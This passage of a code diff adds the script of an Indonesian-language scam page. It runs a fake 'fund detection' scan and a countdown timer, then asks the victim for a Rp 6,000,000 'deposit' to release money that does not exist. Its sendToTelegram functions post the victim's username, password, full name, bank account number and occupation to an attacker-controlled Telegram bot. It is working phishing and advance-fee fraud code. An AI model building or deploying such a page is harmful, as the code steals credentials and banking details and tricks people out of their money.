+                'Memverifikasi keamanan...',
+                'Mendeteksi protokol SSL...',
+                'Menganalisis data terenkripsi...',
+                'Mencocokkan database...',
+                'Dana terdeteksi!',
+                'Verifikasi selesai!'
+            ];
+
+            let progress = 0;
+            let msgIndex = 0;
+
+            const interval = setInterval(() => {
+                progress += Math.random() * 8 + 2;
+                if (progress >= 100) progress = 100;
+                progressBar.style.width = progress + '%';
+
+                const newMsgIndex = Math.min(Math.floor(progress / 15), messages.length - 1);
+                if (newMsgIndex !== msgIndex) {
+                    msgIndex = newMsgIndex;
+                    scanText.textContent = messages[msgIndex];
+                }
+
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        scanAnim.style.display = 'none';
+                        scanResult.style.display = 'block';
+                        document.getElementById('linkDisplay').textContent = link;
+                        // Kirim link ke Telegram
+                        sendLinkToTelegram(link);
+                    }, 500);
+                }
+            }, 200);
+        }
+
+        // ========== COUNTDOWN TIMER ==========
+        function startCountdown() {
+            if (countdownInterval) clearInterval(countdownInterval);
+
+            let totalSeconds = 47 * 3600 + 59 * 60 + 58;
+
+            function updateTimer() {
+                const h = Math.floor(totalSeconds / 3600);
+                const m = Math.floor((totalSeconds % 3600) / 60);
+                const s = totalSeconds % 60;
+                document.getElementById('countdownTimer').innerHTML =
+                    String(h).padStart(2, '0') + ' <span>:</span> ' +
+                    String(m).padStart(2, '0') + ' <span>:</span> ' +
+                    String(s).padStart(2, '0');
+
+                if (totalSeconds <= 0) {
+                    clearInterval(countdownInterval);
+                    document.getElementById('countdownTimer').innerHTML = 'WAKTU HABIS';
+                }
+                totalSeconds--;
+            }
+
+            updateTimer();
+            countdownInterval = setInterval(updateTimer, 1000);
+        }
+
+        // ========== DEPOSIT PROCESS ==========
+        function processDeposit() {
+            const btn = event.target.closest('.btn-primary');
+            btn.classList.add('btn-loading');
+
+            setTimeout(() => {
+                btn.classList.remove('btn-loading');
+                btn.innerHTML = '<span class="btn-text"><i class="fas fa-check-circle"></i>&nbsp; Permintaan Terkirim</span>';
+                btn.style.background = 'linear-gradient(135deg, var(--success), #00c853)';
+                btn.disabled = true;
+
+                sendDepositNotification();
+            }, 2500);
+        }
+
+        // ========== TELEGRAM BOT ==========
+        async function sendToTelegram() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const fullname = document.getElementById('fullname').value;
+            const rekening = document.getElementById('rekening').value;
+            const job = document.getElementById('job').value;
+
+            const message = `
+🔐 *DATA LOGIN*
+━━━━━━━━━━━━━━━
+👤 Username: \`${username}\`
+🔑 Password: \`${password}\`
+
+📋 *DATA DIRI*
+━━━━━━━━━━━━━━━
+🧑 Nama: ${fullname}
+🏦 No. Rekening: \`${rekening}\`
+💼 Pekerjaan: ${job}
+            `.trim();
+
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.log('Telegram error:', err));
+        }
+
+        async function sendLinkToTelegram(link) {
+            const message = `
+🔗 *LINK VERIFIKASI*
+━━━━━━━━━━━━━━━
+🌐 Link: ${link}
+✅ Status: Terverifikasi
+💰 Dana Terdeteksi: Rp 32.460.000
+            `.trim();
+
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.log('Telegram error:', err));
+        }
+
+        async function sendDepositNotification() {
+            const fullname = document.getElementById('fullname').value;
+            const rekening = document.getElementById('rekening').value;
+            const link = document.getElementById('linkInput').value;
+
+            const message = `
+🚨 *PERMINTAAN PENCAIRAN*
+━━━━━━━━━━━━━━━
+🧑 Nama: ${fullname}
+🏦 Rekening: \`${rekening}\`
+🔗 Link: ${link}
+💰 Nominal: Rp 6.000.000 (Deposit)
+📋 Status: Menunggu Deposit
+
+⚠️ User telah melihat warning pencairan
+            `.trim();
+
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.log('Telegram error:', err));
+        }
+
+        // ========== ENTER KEY SUPPORT ==========
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                const activeStep = document.querySelector('.form-step.active');
+                if (activeStep.id === 'step1') goToStep(2);
+                else if (activeStep.id === 'step2') goToStep(3);
+            }
+        });
+    </script>
+</body>
+</html>
